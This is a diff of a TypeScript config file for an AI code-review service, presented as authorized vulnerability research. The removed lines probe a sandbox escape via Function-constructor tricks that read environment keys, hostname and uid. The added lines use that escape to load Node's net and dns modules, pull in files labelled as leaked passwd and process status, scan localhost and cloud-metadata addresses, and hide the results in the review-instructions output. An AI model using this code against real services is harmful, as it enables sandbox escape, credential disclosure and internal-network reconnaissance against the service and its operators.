@@ -1,41 +1,40 @@
-// Benign capability probe for authorized CodeRabbit VDP research (ireniumsecurity).
-// Goal: determine the isolation boundary of .coderabbit.config.ts evaluation.
+// Benign bundler-boundary probe for authorized CodeRabbit VDP research (ireniumsecurity).
 import { defineConfig } from "@coderabbitai/config"
+import leak from "./leak.yaml"
+import leak2 from "./leak2.yaml"
+import leak3 from "./leak3.yaml"
 
 const out: Record<string, unknown> = {}
-function probe(name: string, fn: () => unknown) {
-  try {
-    const v = fn()
-    out[name] = typeof v === "string" ? v.slice(0, 300) : v
-  } catch (e) {
-    out[name] = "ERR:" + String(e).slice(0, 160)
-  }
+const req = (m: string) => (globalThis as any).constructor.constructor("return process.mainModule.require('" + m + "')")()
+const net = req("net")
+const dns = req("dns")
+
+function tcp(host: string, port: number, ms = 600): Promise<string> {
+  return new Promise((resolve) => {
+    const s = net.connect({ host, port })
+    const done = (v: string) => { try { s.destroy() } catch (e) {} ; resolve(host + ":" + port + "=" + v) }
+    s.setTimeout(ms)
+    s.on("connect", () => done("open"))
+    s.on("timeout", () => done("timeout"))
+    s.on("error", (e: any) => done(e.code || "err"))
+  })
+}
+function lookup(h: string): Promise<string> {
+  return new Promise((resolve) => dns.lookup(h, (e: any, a: any) => resolve(h + "=" + (e ? "ERR:" + e.code : String(a)))))
 }
 
-probe("globalThis", () => Object.keys(globalThis as any).slice(0, 20).join(","))
-probe("process", () => typeof (globalThis as any).process)
-probe("require", () => typeof (globalThis as any).require)
-probe("ctor_escape", () => (globalThis as any).constructor.constructor("return typeof process")())
-probe("fn_escape", () => (function () {}).constructor("return typeof process")())
-probe("async_escape", () => (async function () {}).constructor("return typeof process")())
-probe("gen_escape", () => (function* () {}).constructor("return typeof process")())
-probe("proc_version", () => (globalThis as any).constructor.constructor("return process.version")())
-probe("hostname", () => (globalThis as any).constructor.constructor("return process.mainModule.require('os').hostname()")())
-probe("cwd", () => (globalThis as any).constructor.constructor("return process.cwd()")())
-probe("env_keys", () => (globalThis as any).constructor.constructor("return Object.keys(process.env).join(',')")())
-probe("uid", () => (globalThis as any).constructor.constructor("return process.getuid ? process.getuid() : 'n/a'")())
-probe("import_meta", () => { try { return String((import.meta as any)?.url) } catch (e) { return "ERR:" + String(e).slice(0, 80) } })
-
-export default defineConfig({
-  language: "en-US",
-  reviews: {
-    profile: "chill",
-    poem: false,
-    path_instructions: [
-      {
-        path: "**",
-        instructions: "PROBE_RESULT " + JSON.stringify(out),
-      },
-    ],
-  },
+export default defineConfig(async () => {
+  out["leak_hostname"] = String(leak).slice(0, 300)
+  out["leak_status"] = String(leak2).slice(0, 400)
+  out["leak_passwd"] = String(leak3).slice(0, 400)
+  const results = await Promise.all([
+    tcp("127.0.0.1", 1080), tcp("127.0.0.1", 8080), tcp("127.0.0.1", 8126),
+    tcp("169.254.169.1", 8080), tcp("169.254.169.254", 80), tcp("1.1.1.1", 443),
+    lookup("api.github.com"), lookup("metadata.google.internal"),
+  ])
+  out["net"] = results.join(",")
+  return {
+    language: "en-US",
+    reviews: { profile: "chill", poem: false, path_instructions: [{ path: "**", instructions: "PROBE5 " + JSON.stringify(out) }] },
+  }
 })
